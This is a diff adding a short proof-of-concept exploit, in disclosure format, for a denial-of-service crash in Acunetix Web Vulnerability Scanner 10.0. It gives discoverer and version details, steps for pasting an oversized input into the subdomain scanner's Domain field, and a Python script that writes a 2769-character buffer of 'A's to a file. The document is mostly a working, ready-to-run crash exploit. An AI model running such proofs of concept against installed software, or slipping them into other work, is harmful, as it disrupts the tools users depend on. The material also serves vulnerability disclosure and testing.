@@ -1,0 +1,23 @@
+# Exploit Title : Acunetix Web Vulnerability Scanner 10.0 Build 20150623 - Denial of Service (PoC)
+# Discovery by: Javier Enrique Rodriguez Gutierrez
+# Discovery Date    : 2018-08-11
+# Vendor Homepage: https://www.acunetix.com
+# Tested Version    : 10.0
+# Vulnerability Type    : Denial of Service (PoC)
+# Tested on OS  : Windows 10 PRO x86 en
+  
+
+# 1 . run python code : python generate.py
+# 2 . open generate.txt and copy content to clipboard
+# 3 . open "Acunetix Web Vulnerability Scanner 10.0"
+# 4 . from Tools Explorer --> subdomain scanner
+# 5 . Paste ClipBoard on "Domain"
+# 6 . Click start
+# 7 . Crashed
+ 
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+buffer = "\x41" * 2769
+f = open ("generate.txt", "w")
+f.write(buffer)
+f.close()
